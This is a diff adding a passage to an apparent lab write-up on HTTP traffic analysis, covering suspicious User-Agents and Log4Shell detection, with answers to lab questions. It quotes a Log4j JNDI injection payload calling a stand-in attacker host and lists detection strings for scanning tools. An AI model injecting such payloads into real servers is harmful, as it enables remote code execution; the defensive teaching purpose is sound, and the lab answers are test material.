@@ -419,3 +419,78 @@ Ans: ***resume.doc***
 Ans: ***CHMOD 777***
 
 
+---
+# Cleartext Protocol Analysis: HTTP
+
+## HTTP Analysis (in a nutshell)
+
+**Purpose:** Inspect web traffic for suspicious or malicious activity.
+
+### Key Focus Areas:
+
+* **Request Methods**: Unusual `PUT`, `DELETE`, or repeated `POST` requests may be signs of attack.
+* **URLs & Parameters**: Look for anomalies (e.g., `../../`, encoded payloads, SQL-like strings).
+* **Headers**: Suspicious headers (e.g., malformed `Host`, `Referer`, or `User-Agent`) can indicate scanning tools.
+* **Response Codes**: Lots of `401`, `403`, or `500` responses may signal probing or exploitation.
+* **Payloads**: Look for signs of injection (XSS, SQLi, RCE) in POST bodies or query strings.
+
+## User-Agent Analysis (in a nutshell)
+
+**Purpose:** Identify bots, scanners, or spoofed clients.
+
+### Key Indicators:
+
+* **Outdated Versions**: User-Agents showing old Chrome, Firefox, etc., may be spoofed or vulnerable clients.
+* **Tool Signatures**: User-Agents like `sqlmap`, `Nikto`, `curl`, or `python-requests` reveal automated tools.
+* **Frequency & Volume**: Hundreds of requests per second with the same UA is not normal human behavior.
+* **Inconsistencies**: Linux UAs with `Edge` or Safari UAs with `Windows` — often faked.
+
+**Use Case**: Detect brute force attacks, scrapers, scanners, or malware beaconing.
+
+## Log4j (Log4Shell) Analysis (in a nutshell)
+
+**Vulnerability**: CVE-2021-44228 — allows **remote code execution (RCE)** by injecting JNDI payloads into loggable fields.
+
+### How It’s Exploited:
+
+* Attacker sends payload like:
+  `${jndi:ldap://attacker.com/a}`
+* Injected in HTTP headers: `User-Agent`, `Referer`, `X-Api-Version`, etc.
+* If the vulnerable server logs the input without sanitization → it performs the malicious lookup.
+
+### What to Look For:
+
+* **Suspicious JNDI strings** in logs or packets: `${jndi:ldap://...}`, `${jndi:rmi://...}`
+* **Strange HTTP headers** containing these payloads.
+* **Outbound traffic** from internal systems to attacker-controlled IPs/domains (LDAP/RMI).
+
+## Answer the questions below
+
+### Q1. Investigate the user agents. What is the number of anomalous  "user-agent" types?
+
+- pic
+- 
+- 
+Ans: ******
+### Q2.
+Ans: ******
+
+### Q3.Locate the "Log4j" attack starting phase. What is the packet number?
+
+- `http.user_agent contains "jndi"`
+- ![Screenshot 2025-05-07 152243](https://github.com/user-attachments/assets/4eaa5937-c21f-4377-b9cd-723e0fb2e1b3)
+
+Ans: ***444***
+
+### Q4.Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
+
+
+- in frame 444, there is a base64 command injected in the user_agent field
+- ![Screenshot 2025-05-07 152430](https://github.com/user-attachments/assets/a56152eb-edd1-4a48-87d4-a53aba9ffe73)
+- defange the ip using CyberChef website
+
+Ans: ***62[.]210[.]130[.]250***
+
+
+
+
